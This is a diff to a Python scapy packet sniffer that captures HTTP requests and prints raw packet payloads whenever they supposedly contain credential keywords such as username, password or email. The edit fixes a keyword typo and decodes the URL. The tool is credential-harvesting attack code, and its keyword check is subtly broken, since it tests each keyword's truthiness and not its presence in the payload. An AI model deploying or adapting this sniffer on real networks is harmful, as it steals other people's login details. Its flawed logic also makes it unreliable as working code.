@@ -15,9 +15,9 @@ def sniff(face):
 def process_sniffed_packet(packet):
     if packet.haslayer(http.HTTPRequest):
         url = packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
-        print("[+] Http Request >> " + url)
+        print("[+] Http Request >> " + url.decode("utf-8"))
         if packet.haslayer(scapy.Raw):
-            keys = ["usernae", "password", "pass", "email"]
+            keys = ["username", "password", "pass", "email"]
             for key in keys:
                 if key:
                     print("[+] Passwords and Username >>" + packet[scapy.Raw].load)
